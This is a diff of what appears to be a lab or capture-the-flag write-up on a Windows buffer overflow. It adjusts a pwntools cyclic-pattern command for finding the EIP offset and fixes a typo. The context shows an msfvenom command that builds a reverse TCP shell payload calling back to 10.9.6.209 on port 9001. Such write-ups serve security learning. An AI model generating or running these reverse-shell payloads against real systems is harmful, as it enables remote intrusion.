@@ -73,7 +73,7 @@ Although, one interesting thing is that the EIP is overwritten with "A"s as oppo
 Now that we know 2100 bytes will crash and overwrite the EIP, let's find where the offset is to try and overwrite the EIP address. Instead of `msf-pattern_create`, let's use `pwn cyclic` from the pwntools Python module to use a custom alphabet for cyclic string.
 
 ```bash
-pwn cyclic 2100
+pwn cyclic 2100 -a "123456789ABCDEF"
 ```
 
 Let's use the cyclic pattern to try and identify the offset.
@@ -251,7 +251,7 @@ To accurately use the correct address for our new EIP, we have to first "hexlify
 
 ## Generating shellcode
 
-First, let's use msfvenom to generate our shellcode. We need to make sure we use a hex format so the program correct interprets the shellcode.
+First, let's use msfvenom to generate our shellcode. We need to make sure we use a hex format so the program correctly interprets the shellcode.
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.6.209 LPORT=9001 EXITFUNC=thread -b "\x00" -f hex
